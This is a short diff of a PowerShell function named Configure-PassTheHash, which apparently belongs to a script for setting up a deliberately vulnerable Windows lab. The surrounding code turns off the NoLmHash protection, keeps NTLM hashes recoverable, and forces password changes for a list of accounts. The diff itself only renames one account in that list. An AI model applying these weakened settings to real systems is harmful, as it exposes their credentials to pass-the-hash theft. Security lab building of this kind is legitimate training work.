@@ -239,7 +239,7 @@ function Configure-PassTheHash {
     Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa" -Name NoLmHash -Value 0 -ErrorAction SilentlyContinue
     
     # Store NTLM hashes in a recoverable format
-    $users = @("Administrator", "admin", "backup")
+    $users = @("Administrator", "overclock", "backup")
     foreach ($user in $users) {
         # Force password change to ensure hashes are stored
         $password = switch($user) {
